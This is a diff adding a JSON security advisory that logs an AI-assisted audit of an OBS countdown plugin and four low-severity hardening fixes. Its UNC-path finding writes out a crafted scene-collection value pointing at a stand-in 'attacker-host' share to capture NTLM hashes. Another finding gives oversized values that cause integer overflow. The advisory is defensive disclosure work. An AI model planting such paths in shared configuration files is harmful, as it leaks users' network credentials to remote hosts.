@@ -1,0 +1,322 @@
+{
+  "document": {
+    "category": "csaf_security_advisory",
+    "csaf_version": "2.0",
+    "lang": "en",
+    "title": "Security audit 2026-11-07: input clamping, network paths, locking and CI pinning",
+    "publisher": {
+      "category": "vendor",
+      "name": "DMX Digital",
+      "namespace": "https://github.com/simulacra10/obs-nixie-countdown"
+    },
+    "distribution": {
+      "tlp": {
+        "label": "WHITE"
+      }
+    },
+    "aggregate_severity": {
+      "text": "Low"
+    },
+    "acknowledgments": [
+      {
+        "names": [
+          "Claude (Anthropic)"
+        ],
+        "summary": "found during an AI-assisted review of the full code base, directed by the maintainer"
+      }
+    ],
+    "notes": [
+      {
+        "category": "summary",
+        "title": "Summary",
+        "text": "A review of the plugin source (src/), dev-install.sh and the GitHub Actions workflows found no memory-safety, injection or secret-exposure issues. Four low-severity hardening issues were found and fixed: unclamped settings from scene collections, network paths for the custom image folder on Windows, unlocked reads of shared size fields, and CI actions referenced by mutable tags."
+      },
+      {
+        "category": "general",
+        "title": "Scope and areas found sound",
+        "text": "Checked and found sound: bounds checks on the 32-byte layout buffer (append_char, append_num); no user data used as a format string; timer state consistently guarded by its mutex; texture reload performed inside obs_enter_graphics so textures are never freed mid-render; weak source references and QPointer use in context-bar.cpp; quoting and set -euo pipefail in dev-install.sh; CI uses pull_request (not pull_request_target), read-only token permissions except tag releases, and no attacker-controlled expressions inside run scripts. Out of scope: image decoding, which is done by libobs."
+      },
+      {
+        "category": "general",
+        "title": "Affected and fixed versions",
+        "text": "Affected: version 1.1.0 as committed up to a19e5fc. Fixed: the main branch commit that adds this log. No release had been published when these issues were fixed."
+      }
+    ],
+    "references": [
+      {
+        "category": "self",
+        "summary": "This log",
+        "url": "https://github.com/simulacra10/obs-nixie-countdown/blob/main/security-log/nixie-sec-2026-11-07.json"
+      },
+      {
+        "category": "external",
+        "summary": "Project repository",
+        "url": "https://github.com/simulacra10/obs-nixie-countdown"
+      }
+    ],
+    "tracking": {
+      "id": "NIXIE-SEC-2026-11-07",
+      "status": "final",
+      "version": "1",
+      "initial_release_date": "2026-11-07T12:30:00-05:00",
+      "current_release_date": "2026-11-07T12:30:00-05:00",
+      "revision_history": [
+        {
+          "date": "2026-11-07T12:30:00-05:00",
+          "number": "1",
+          "summary": "Initial log of the 2026-11-07 audit."
+        }
+      ]
+    }
+  },
+  "product_tree": {
+    "branches": [
+      {
+        "category": "vendor",
+        "name": "DMX Digital",
+        "branches": [
+          {
+            "category": "product_name",
+            "name": "Nixie Countdown for OBS Studio",
+            "branches": [
+              {
+                "category": "product_version",
+                "name": "1.1.0",
+                "product": {
+                  "product_id": "CSAFPID-0001",
+                  "name": "Nixie Countdown for OBS Studio 1.1.0"
+                }
+              },
+              {
+                "category": "product_version",
+                "name": "main after a19e5fc",
+                "product": {
+                  "product_id": "CSAFPID-0002",
+                  "name": "Nixie Countdown for OBS Studio, main branch with 2026-11-07 fixes"
+                }
+              }
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "vulnerabilities": [
+    {
+      "ids": [
+        {
+          "system_name": "obs-nixie-countdown security log",
+          "text": "NIXIE-2026-001"
+        }
+      ],
+      "title": "Unclamped settings from scene collections cause signed integer overflow",
+      "cwe": {
+        "id": "CWE-190",
+        "name": "Integer Overflow or Wraparound"
+      },
+      "discovery_date": "2026-11-07T12:30:00-05:00",
+      "notes": [
+        {
+          "category": "summary",
+          "title": "Summary",
+          "text": "Duration, spacing and format settings were range-limited only in the Properties window, not when read back from settings, so a crafted scene collection could trigger signed overflow."
+        },
+        {
+          "category": "details",
+          "title": "Details and failure scenario",
+          "text": "Location: src/nixie-countdown.c, nixie_update (total = h * 3600 + m * 60 + s) and layout_width (x += n->spacing * (count - 1)). Scene collections are JSON files that users share and import. Failure scenario: a collection sets \"hours\": 9223372036854775807 or \"spacing\": 2147483647. h * 3600 overflows int64_t and the spacing sum overflows int, both undefined behavior in C. In practice this produced a wrong source size or a source that did not draw; the layout buffer stayed bounded, so no memory corruption was possible."
+        }
+      ],
+      "product_status": {
+        "known_affected": [
+          "CSAFPID-0001"
+        ],
+        "fixed": [
+          "CSAFPID-0002"
+        ]
+      },
+      "remediations": [
+        {
+          "category": "vendor_fix",
+          "date": "2026-11-07T12:30:00-05:00",
+          "details": "nixie_update now clamps hours to 0-999, minutes and seconds to 0-59, spacing to -60..150 and format to the known values with a new clamp_i64 helper. The ranges are shared constants (HOURS_MAX, SPACING_MIN, SPACING_MAX) also used by the Properties window.",
+          "product_ids": [
+            "CSAFPID-0001"
+          ],
+          "url": "https://github.com/simulacra10/obs-nixie-countdown"
+        }
+      ],
+      "threats": [
+        {
+          "category": "impact",
+          "details": "Low. Requires the user to load a crafted scene collection; worst case is a misdrawn source.",
+          "product_ids": [
+            "CSAFPID-0001"
+          ]
+        }
+      ]
+    },
+    {
+      "ids": [
+        {
+          "system_name": "obs-nixie-countdown security log",
+          "text": "NIXIE-2026-002"
+        }
+      ],
+      "title": "Custom tube image folder accepts network (UNC) paths on Windows",
+      "cwe": {
+        "id": "CWE-73",
+        "name": "External Control of File Name or Path"
+      },
+      "discovery_date": "2026-11-07T12:30:00-05:00",
+      "notes": [
+        {
+          "category": "summary",
+          "title": "Summary",
+          "text": "On Windows, the custom image folder setting could name a remote share, causing OBS to contact that host and potentially send the user's network credentials."
+        },
+        {
+          "category": "details",
+          "title": "Details and failure scenario",
+          "text": "Location: src/nixie-countdown.c, load_tex (dstr_printf(&path, \"%s/%s\", custom_dir, name)). Failure scenario: a shared scene collection sets \"image_dir\": \"\\\\\\\\attacker-host\\\\share\". Loading 0.png from that path makes Windows open an SMB connection to attacker-host, which can capture the user's NTLM hash. OBS's built-in Image source has the same exposure."
+        }
+      ],
+      "product_status": {
+        "known_affected": [
+          "CSAFPID-0001"
+        ],
+        "fixed": [
+          "CSAFPID-0002"
+        ]
+      },
+      "remediations": [
+        {
+          "category": "vendor_fix",
+          "date": "2026-11-07T12:30:00-05:00",
+          "details": "New is_allowed_dir helper: on Windows, folder paths starting with two slashes or backslashes (\\\\host\\share, //host/share, \\\\?\\ forms) are ignored with a log warning and the built-in images are used. Other platforms are unchanged.",
+          "product_ids": [
+            "CSAFPID-0001"
+          ],
+          "url": "https://github.com/simulacra10/obs-nixie-countdown"
+        }
+      ],
+      "threats": [
+        {
+          "category": "impact",
+          "details": "Low. Windows only, requires loading a crafted scene collection, and the same exposure exists in OBS itself.",
+          "product_ids": [
+            "CSAFPID-0001"
+          ]
+        }
+      ]
+    },
+    {
+      "ids": [
+        {
+          "system_name": "obs-nixie-countdown security log",
+          "text": "NIXIE-2026-003"
+        }
+      ],
+      "title": "Texture size fields read and written without the source mutex",
+      "cwe": {
+        "id": "CWE-362",
+        "name": "Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')"
+      },
+      "discovery_date": "2026-11-07T12:30:00-05:00",
+      "notes": [
+        {
+          "category": "summary",
+          "title": "Summary",
+          "text": "nixie_get_height read the texture sizes and show_separators without the lock, and load_textures wrote the sizes without it, while get_width read them under the lock."
+        },
+        {
+          "category": "details",
+          "title": "Details and failure scenario",
+          "text": "Location: src/nixie-countdown.c, nixie_get_height and load_textures. get_width and get_height are called from the UI and video threads while nixie_update (UI thread) can reload textures. Failure scenario: changing the custom image folder while the source is shown races the size writes against the reads; at worst one frame used a stale size. A data race is still undefined behavior in C."
+        }
+      ],
+      "product_status": {
+        "known_affected": [
+          "CSAFPID-0001"
+        ],
+        "fixed": [
+          "CSAFPID-0002"
+        ]
+      },
+      "remediations": [
+        {
+          "category": "vendor_fix",
+          "date": "2026-11-07T12:30:00-05:00",
+          "details": "load_textures now writes the size fields under the source mutex (lock order: graphics, then mutex, the same order video_render uses), and nixie_get_height reads them under the mutex.",
+          "product_ids": [
+            "CSAFPID-0001"
+          ],
+          "url": "https://github.com/simulacra10/obs-nixie-countdown"
+        }
+      ],
+      "threats": [
+        {
+          "category": "impact",
+          "details": "Low. Benign in practice on current compilers and hardware.",
+          "product_ids": [
+            "CSAFPID-0001"
+          ]
+        }
+      ]
+    },
+    {
+      "ids": [
+        {
+          "system_name": "obs-nixie-countdown security log",
+          "text": "NIXIE-2026-004"
+        }
+      ],
+      "title": "GitHub Actions referenced by mutable version tags",
+      "cwe": {
+        "id": "CWE-829",
+        "name": "Inclusion of Functionality from Untrusted Control Sphere"
+      },
+      "discovery_date": "2026-11-07T12:30:00-05:00",
+      "notes": [
+        {
+          "category": "summary",
+          "title": "Summary",
+          "text": "CI workflows used actions/checkout, cache, upload-artifact and download-artifact by the movable @v4 tag, so a compromised or re-pointed tag would run new code in the build that produces release packages."
+        },
+        {
+          "category": "details",
+          "title": "Details and failure scenario",
+          "text": "Location: .github/workflows/build-project.yaml, push.yaml and check-format.yaml (15 uses). Failure scenario: an upstream tag is moved to malicious code; the next push builds and packages the plugin with it, and tag pushes run with contents: write. The release action (softprops/action-gh-release) was already pinned to a commit hash."
+        }
+      ],
+      "product_status": {
+        "known_affected": [
+          "CSAFPID-0001"
+        ],
+        "fixed": [
+          "CSAFPID-0002"
+        ]
+      },
+      "remediations": [
+        {
+          "category": "vendor_fix",
+          "date": "2026-11-07T12:30:00-05:00",
+          "details": "Pinned each action to the commit its v4 tag pointed to on 2026-11-07, with the exact version in a comment: checkout 11d5960 (v4.4.0), cache 0057852 (v4.3.0), upload-artifact ea165f8 (v4.6.2), download-artifact d3f86a1 (v4.3.0). Updates now need a deliberate hash change.",
+          "product_ids": [
+            "CSAFPID-0001"
+          ],
+          "url": "https://github.com/simulacra10/obs-nixie-countdown"
+        }
+      ],
+      "threats": [
+        {
+          "category": "impact",
+          "details": "Low. Supply-chain hardening; no compromise of these actions is known.",
+          "product_ids": [
+            "CSAFPID-0001"
+          ]
+        }
+      ]
+    }
+  ]
+}
